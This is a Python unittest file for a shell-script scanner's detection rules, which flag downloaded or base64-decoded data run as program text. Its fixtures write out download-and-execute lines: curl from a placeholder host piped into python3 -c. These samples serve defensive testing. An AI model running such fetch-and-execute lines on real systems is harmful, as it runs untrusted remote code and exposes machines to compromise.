"""Inert source contracts: interpreter program expansions versus argv data."""

import unittest
from test_qindun_certify import MODULE

scan = MODULE._shell_flow_findings

CASES = [
    (
        "direct_program",
        'DATA=$(curl https://example.invalid/data)\npython3 -c "$DATA"',
        True,
    ),
    (
        "source_literal_interpolation",
        "DATA=$(curl https://example.invalid/data)\npython3 -c \"value='$DATA'; print(value)\" ",
        True,
    ),
    (
        "assignment_result",
        "DATA=$(curl https://example.invalid/data)\nOUT=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$DATA', safe=''))\")",
        True,
    ),
    (
        "argv_data",
        "DATA=$(curl https://example.invalid/data)\npython3 -c 'import sys; print(sys.argv[1])' \"$DATA\" ",
        False,
    ),
    (
        "literal_dollar",
        "DATA=$(curl https://example.invalid/data)\npython3 -c 'print(\"$DATA\")' ",
        False,
    ),
    (
        "escaped_dollar",
        "DATA=$(curl https://example.invalid/data)\npython3 -c \"print('\\$DATA')\"",
        False,
    ),
    (
        "echo_documentation",
        "DATA=$(curl https://example.invalid/data)\necho 'python3 -c \"$DATA\"' ",
        False,
    ),
    (
        "comment",
        'DATA=$(curl https://example.invalid/data)\n# python3 -c "$DATA"',
        False,
    ),
    (
        "unknown_source",
        'python3 -c "$INPUT"',
        False,
    ),
    (
        "same_file_mixed",
        'DATA=$(curl https://example.invalid/data)\npython3 -c \'import sys; print(sys.argv[1])\' "$DATA"\npython3 -c "$DATA" ',
        True,
    ),
    (
        "multiline_program",
        "DATA=$(curl https://example.invalid/data)\npython3 -c \"\nvalue='$DATA'\nprint(value)\n\"",
        True,
    ),
    (
        "alias_json_field",
        "DATA=$(curl https://example.invalid/data)\nQRI=$(echo \"$DATA\" | python3 -c \"import sys,json; print(json.load(sys.stdin).get('secureQri',''))\")\nENCODED=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$QRI', safe=''))\")",
        True,
    ),
    (
        "braced_variable",
        'DATA=$(curl https://example.invalid)\npython3 -c "${DATA}"',
        True,
    ),
    (
        "concatenated_word",
        "DATA=$(curl https://example.invalid)\npython3 -c 'value='\"$DATA\"",
        True,
    ),
    (
        "fixed_overwrite",
        'DATA=$(curl https://example.invalid)\nDATA=public\npython3 -c "$DATA"',
        False,
    ),
    (
        "decoded_program",
        'DATA=$(printf eA== | base64 -d)\npython3 -c "$DATA"',
        False,
    ),
    (
        "comment_after_fixed",
        "DATA=$(curl https://example.invalid)\npython3 -c 'print(1)' # \"$DATA\"",
        False,
    ),
    (
        "unterminated_program",
        'DATA=$(curl https://example.invalid)\npython3 -c "$DATA',
        False,
    ),
    (
        "literal_default_program",
        'DATA=$(curl https://example.invalid)\npython3 -c "${DATA:-fallback}"',
        True,
    ),
    (
        "literal_alternative_program",
        'DATA=$(curl https://example.invalid)\npython3 -c "${DATA:+pass}"',
        False,
    ),
    (
        "alternative_and_real_program",
        'DATA=$(curl https://example.invalid)\npython3 -c "${DATA:+pass}"\npython3 -c "$DATA"',
        True,
    ),
    (
        "function_not_invoked",
        'DATA=$(curl https://example.invalid)\ncheck() {\n python3 -c "$DATA"\n}',
        True,
    ),
]


class ShellPythonSourceTests(unittest.TestCase):
    def test_response_provenance(self):
        cases = [
            (
                "stdout_device",
                'DATA=$(curl -s -w "%{http_code}" -o /dev/stdout https://example.invalid)\npython3 -c "$DATA"',
                True,
            ),
            (
                "status_only",
                'CODE=$(curl -sL -w "%{http_code}" -o /tmp/response.txt -X DELETE -H "Authorization: Bearer ${TOKEN}" "${URL}")\npython3 -c "print(\'$CODE\')"',
                False,
            ),
            (
                "body_stdout",
                'BODY=$(curl -sL -w "%{http_code}" -o - https://example.invalid)\npython3 -c "print(\'$BODY\')"',
                True,
            ),
            (
                "header_stdout",
                'BODY=$(curl -sL -D - -w "%{http_code}" -o /tmp/response.txt https://example.invalid)\npython3 -c "print(\'$BODY\')"',
                True,
            ),
            (
                "file_body",
                "CODE=$(curl -sL -w \"%{http_code}\" -o /tmp/response.txt https://example.invalid)\nBODY=$(cat /tmp/response.txt 2>/dev/null || echo \"\")\npython3 -c \"print('''$BODY''')\"",
                True,
            ),
            (
                "file_body_argv",
                'CODE=$(curl -sL -w "%{http_code}" -o /tmp/response.txt https://example.invalid)\nBODY=$(cat /tmp/response.txt)\npython3 -c \'import sys; print(sys.argv[1])\' "$BODY"',
                False,
            ),
            (
                "unknown_writeout",
                'CODE=$(curl -sL -w "%{url_effective}" -o /tmp/response.txt https://example.invalid)\npython3 -c "print(\'$CODE\')"',
                True,
            ),
            (
                "ordinary_file",
                "BODY=$(cat /tmp/response.txt)\npython3 -c \"print('''$BODY''')\"",
                False,
            ),
        ]
        for name, source, expected in cases:
            with self.subTest(name=name):
                self.assertEqual(
                    any(
                        h.rule_id == "QINDUN.LOCAL.D3.DOWNLOAD_EXECUTION_FLOW"
                        for h in scan("main.sh", source)
                    ),
                    expected,
                )

    def test_literal_provenance(self):
        cases = [
            (
                "literal_alias",
                "DATA=$(curl https://example.invalid)\nALIAS='$DATA'\npython3 -c \"$ALIAS\"",
                False,
            ),
            (
                "literal_curl",
                "DATA='curl https://example.invalid'\npython3 -c \"$DATA\"",
                False,
            ),
            (
                "literal_decode",
                "DATA='base64 -d'\npython3 -c \"$DATA\"",
                False,
            ),
            (
                "escaped_alias",
                'DATA=$(curl https://example.invalid)\nALIAS="\\$DATA"\npython3 -c "$ALIAS"',
                False,
            ),
            (
                "expanded_alias",
                'DATA=$(curl https://example.invalid)\nALIAS="$DATA"\npython3 -c "$ALIAS"',
                True,
            ),
            (
                "trailing_escape",
                'DATA=$(curl https://example.invalid)\npython3 -c "$DATA"\\',
                False,
            ),
        ]
        for name, source, expected in cases:
            with self.subTest(name=name):
                self.assertEqual(
                    any(
                        h.rule_id == "QINDUN.LOCAL.D3.DOWNLOAD_EXECUTION_FLOW"
                        for h in scan("main.sh", source)
                    ),
                    expected,
                )

    def test_program_contracts(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                self.assertEqual(
                    any(h.rule_id == "QINDUN.LOCAL.D3.DOWNLOAD_EXECUTION_FLOW" for h in hits),
                    expected,
                )

    def test_decoded_program(self):
        source = 'DATA=$(printf eA== | base64 -d)\npython3 -c "$DATA"'
        self.assertIn(
            "QINDUN.LOCAL.D3.DECODE_EXECUTION_FLOW", {h.rule_id for h in scan("main.sh", source)}
        )

    def test_function_reachability(self):
        source = 'DATA=$(curl https://example.invalid)\ncheck() {\n python3 -c "$DATA"\n}'
        self.assertEqual(
            {
                h.disposition
                for h in scan("main.sh", source)
                if h.rule_id == "QINDUN.LOCAL.D3.DOWNLOAD_EXECUTION_FLOW"
            },
            {"candidate"},
        )

    def test_mixed_physical_line(self):
        source = 'DATA=$(curl https://example.invalid)\npython3 -c \'import sys; print(sys.argv[1])\' "$DATA"\nOUT=$(python3 -c \\\n "$DATA")'
        self.assertEqual(
            [
                h.line
                for h in scan("main.sh", source)
                if h.rule_id == "QINDUN.LOCAL.D3.DOWNLOAD_EXECUTION_FLOW"
            ],
            [3],
        )
